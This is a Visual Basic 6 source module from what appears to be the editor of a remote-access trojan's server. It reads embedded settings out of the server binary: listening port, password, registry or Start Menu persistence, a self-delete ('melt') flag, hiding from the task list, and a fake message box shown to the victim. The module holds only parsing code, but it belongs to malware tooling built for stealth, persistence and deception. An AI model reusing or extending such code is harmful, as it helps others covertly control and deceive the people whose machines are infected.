Attribute VB_Name = "modLoad"
'***************************************
'*      TITLE: LOAD SERVER MODULE      *
'* PROGRAMMER: BARRY FRENCH A.K.A (EC) *
'*        USE WITH: EDIT SERVER        *
'***************************************

Option Explicit

'Opens the Common Dialogue filename for binary reading
Public Sub OpenBinary()
    Open frmEdit.cdgServer.FileName For Binary Access Read As #1
End Sub

'Closes the open file as above
Public Sub CloseBinary()
    Close #1
End Sub

'Finds the port in the open file and returns it as a long
Public Function FindPort() As Long
Dim sFileCont As String

Dim lPort As Long
Dim lPercent As Long
        
        OpenBinary
        
        sFileCont = SetBuffer(sFileCont, LOF(1))
        Get #1, , sFileCont
        
        CloseBinary
        
        lPort = InStr(1, sFileCont, "*PORT*")
        
        If lPort = 0 Then
            FindPort = 0
            Exit Function
        End If
        
        lPort = InStr(lPort, sFileCont, "%")
        lPercent = InStr(lPort + 1, sFileCont, "%")
        
        FindPort = Mid(sFileCont, lPort + 1, (lPercent - lPort) - 1)
End Function

'Find the password in the open file and returns it as a string
Public Function FindPassword() As String
Dim sFileCont As String

Dim lPass As Long
Dim lPercent As Long
    
    OpenBinary
    
    sFileCont = SetBuffer(sFileCont, LOF(1))
    Get #1, , sFileCont
    
    CloseBinary
    
    lPass = InStr(1, sFileCont, "*PASSWORD*")
    
    If lPass = 0 Then
        FindPassword = ""
        Exit Function
    End If
    
    lPass = InStr(lPass, sFileCont, "%")
    lPercent = InStr(lPass + 1, sFileCont, "%")
    
    FindPassword = Mid(sFileCont, lPass + 1, (lPercent - lPass) - 1)
End Function

'Finds the starting method from the open file, returns it as a long
'1 = Registry
'2 = Start Menu
'3 = Both
Public Function FindStartMethod() As Long
Dim sFileCont As String

Dim lStart As Long
Dim lPercent As Long

    OpenBinary
    
    sFileCont = SetBuffer(sFileCont, LOF(1))
    Get #1, , sFileCont
    
    CloseBinary
    
    lStart = InStr(1, sFileCont, "*START_METHOD*")
    
    If lStart = 0 Then
        FindStartMethod = 0
        Exit Function
    End If
    
    lStart = InStr(lStart, sFileCont, "%")
    lPercent = InStr(lStart + 1, sFileCont, "%")
    
    FindStartMethod = Mid(sFileCont, lStart + 1, (lPercent - lStart) - 1)
End Function

'If registry startup (1) is used then this will find the keyname
Public Function FindKeyName() As String
Dim sFileCont As String

Dim lKey As Long
Dim lPercent As Long

    OpenBinary
    
    sFileCont = SetBuffer(sFileCont, LOF(1))
    Get #1, , sFileCont
    
    CloseBinary
    
    lKey = InStr(1, sFileCont, "*KEY_NAME*")
    
    If lKey = 0 Then
        FindKeyName = ""
        Exit Function
    End If
    
    lKey = InStr(lKey, sFileCont, "%")
    lPercent = InStr(lKey + 1, sFileCont, "%")
    
    FindKeyName = Mid(sFileCont, lKey + 1, (lPercent - lKey) - 1)
End Function

'Rerurns True or False stating wheather the server should delete itself
Public Function FindMelt() As Boolean
Dim sFileCont As String
Dim sCheck As String

Dim lMelt As Long
Dim lPercent As Long

    OpenBinary
    
    sFileCont = SetBuffer(sFileCont, LOF(1))
    Get #1, , sFileCont
    
    CloseBinary
    
    lMelt = InStr(1, sFileCont, "*MELT_VALUE*")
    
    If lMelt = 0 Then
        FindMelt = False
        Exit Function
    End If
    
    lMelt = InStr(lMelt, sFileCont, "%")
    lPercent = InStr(lMelt + 1, sFileCont, "%")
    
    sCheck = Mid(sFileCont, lMelt + 1, (lPercent - lMelt) - 1)
    
    If sCheck = "False" Then
        FindMelt = False
    Else
        FindMelt = True
    End If
End Function

'Returns true or false stating wheater or not the server should hide
'itself in the Task List 95/98/ME only
Public Function FindTask() As Boolean
Dim sFileCont As String
Dim sCheck As String

Dim lTask As Long
Dim lPercent As Long

    OpenBinary
    
    sFileCont = SetBuffer(sFileCont, LOF(1))
    Get #1, , sFileCont
    
    CloseBinary
    
    lTask = InStr(1, sFileCont, "*HIDE_TASK*")
    
    If lTask = 0 Then
        FindTask = False
        Exit Function
    End If
    
    lTask = InStr(lTask, sFileCont, "%")
    lPercent = InStr(lTask + 1, sFileCont, "%")
    
    sCheck = Mid(sFileCont, lTask + 1, (lPercent - lTask) - 1)
    
    If sCheck = "False" Then
        FindTask = False
    Else
        FindTask = True
    End If
End Function

'Find the fake message and returns 2 longs representing the icon and buttons
'and 2 strings representing the title and the message
Public Function FindMessage(ByRef lIcon As Long, ByRef lButtons As Long, ByRef sTitle As String, ByRef sMessage As String) As Boolean
Dim sFileCont As String

Dim lMessage As Long
Dim lPercent As Long

    OpenBinary
    
    sFileCont = SetBuffer(sFileCont, LOF(1))
    Get #1, , sFileCont
    
    CloseBinary
    
    lMessage = InStr(1, sFileCont, "*MESSAGE_BOX*")
    
    If lMessage = 0 Then
        FindMessage = False
        Exit Function
    End If
    
    lMessage = InStr(lMessage, sFileCont, "%")
    lPercent = InStr(lMessage + 1, sFileCont, "%")
    
    lIcon = Mid(sFileCont, lMessage + 1, (lPercent - lMessage) - 1)
    
    lMessage = InStr(lPercent + 1, sFileCont, "%")
    
    lButtons = Mid(sFileCont, lPercent + 1, (lMessage - lPercent) - 1)
    
    lPercent = InStr(lMessage + 1, sFileCont, "%")
    
    sTitle = Mid(sFileCont, lMessage + 1, (lPercent - lMessage) - 1)
    
    lMessage = InStr(lPercent + 1, sFileCont, "%")
    
    sMessage = Mid(sFileCont, lPercent + 1, (lMessage - lPercent) - 1)
    
    FindMessage = True
End Function
